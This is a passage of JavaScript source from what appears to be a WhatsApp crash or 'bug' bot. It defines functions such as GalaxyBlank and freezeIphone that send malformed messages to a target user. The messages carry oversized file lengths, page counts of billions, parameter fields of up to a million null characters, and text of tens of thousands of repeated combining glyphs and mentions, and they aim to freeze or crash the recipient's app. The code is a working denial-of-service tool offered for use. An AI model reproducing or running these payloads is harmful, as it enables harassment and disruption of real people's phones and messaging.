          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "999999",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "ᴀɴᴅᴀ sᴏᴘᴀɴ, ᴋᴀᴍɪ sᴇɢᴀɴ, ᴋʏʏ ɪs ʜᴇʀᴇ",
          height: 999999,
          width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath:
            "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList,
            quotedMessage: quotedMsg.message,
            stanzaId: quotedMsg.key.id,
            participant: quotedMsg.key.remoteJid,
          },
          annotations: [
            {
              embeddedContent: { embeddedMusic: embeddedMusic2 },
              embeddedAction: true,
            },
          ],
        },
      },
    },
  ];

  for (const msg of messages) {
    const generated = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: msg,
      },
      {}
    );
    await sock.relayMessage("status@broadcast", generated.message, {
      messageId: generated.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    if ((mention && msg === messages[0]) || (abcd && msg === messages[2])) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: generated.key,
                type: 25,
              },
            },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "true" },
              content: undefined,
            },
          ],
        }
      );
    }
  }
}

async function GalaxyBlank(sock, jid) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [jid],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: {
              text: "Mode Sad",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "9999999999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "Galau Loh.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                mediaKeyTimestamp: "1715880173",
                contactVcard: true
              },
              title: "Galau Dulu Bang..",
              hasMediaAttachment: true
            },
            body: {
              text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(jid, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
          },
          interactiveResponseMessage: {
            body: {
              text: "Bosan",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "Mode Galau",
              paramsJson: "\u0000".repeat(999999),
              version: 3,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "(trigger) Noxxa",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
              },
            },
          },
        },
      }
    }, {});

    await sock.relayMessage(jid, message, {});
  } catch (err) {
    console.error(err);
  }
}

async function freezeIphone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "i p h o n e - f r e e z e" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 9999999471,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}





(async () => {

    console.clear();

    console.log("🚀 Memulai sesi WhatsApp...");

    startSesi();

    console.log("Sukses connected");

    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses

    console.clear();

    console.log(chalk.bold.white(`\n
FUCK⠀⠀⠀`));

})();